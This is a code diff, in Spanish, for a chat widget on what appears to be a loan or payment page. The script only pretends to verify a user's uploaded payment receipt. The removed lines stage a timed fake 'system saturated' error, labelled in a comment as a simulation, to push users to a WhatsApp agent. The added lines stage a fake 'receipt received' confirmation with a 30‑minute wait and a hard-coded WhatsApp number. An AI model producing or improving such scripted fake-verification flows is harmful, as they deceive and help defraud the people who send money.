@@ -202,26 +202,25 @@
                 setTimeout(() => {
                     const botMsg = document.createElement('div');
                     botMsg.className = 'msg msg-bot';
-                    botMsg.innerHTML = "<strong>Validando comprobante...</strong><br>Por favor aguarde en línea, estamos verificando el ingreso en nuestra cuenta central.";
+                    botMsg.innerHTML = "<strong>Comprobante recibido ✓</strong><br>⏳ Aguarde 30 minutos que el sistema procese su solicitud";
                     chatBox.appendChild(botMsg);
                     
-                    // Simulación de "Saturado" después de unos segundos
+                    // Botón de WhatsApp después de procesar
                     setTimeout(() => {
-                        const errorMsg = document.createElement('div');
-                        errorMsg.className = 'msg msg-bot';
-                        errorMsg.style.background = "#fff1f2";
-                        errorMsg.innerHTML = "⚠️ <strong>Error de validación automática</strong><br>El sistema de Verificación inmediata está saturado. Para no demorar su desembolso, envíe el comprobante a nuestro <strong>WhatsApp Directo</strong> para una carga manual.";
-                        chatBox.appendChild(errorMsg);
+                        const wsMsg = document.createElement('div');
+                        wsMsg.className = 'msg msg-bot';
+                        wsMsg.innerHTML = "Si necesitas ayuda mientras esperas, puedes contactarnos por <strong>WhatsApp</strong>:";
+                        chatBox.appendChild(wsMsg);
                         
-                        // Botón de WhatsApp
+                        // Botón de WhatsApp con icono
                         const btnWs = document.createElement('button');
-                        btnWs.innerText = "HABLAR CON ASESOR";
-                        btnWs.style = "width:100%; padding:12px; background:#25d366; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px; cursor:pointer;";
-                        btnWs.onclick = () => window.location.href = "https://wa.me/TUNUMERO";
+                        btnWs.innerHTML = "📱 WhatsApp: +54 9 11 6053359";
+                        btnWs.style = "width:100%; padding:12px; background:#25d366; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px; cursor:pointer; font-size:0.9rem;";
+                        btnWs.onclick = () => window.location.href = "https://wa.me/541164053359";
                         chatBox.appendChild(btnWs);
                         
                         window.scrollTo(0, document.body.scrollHeight);
-                    }, 4000);
+                    }, 2000);
                 }, 1000);
             }
         }
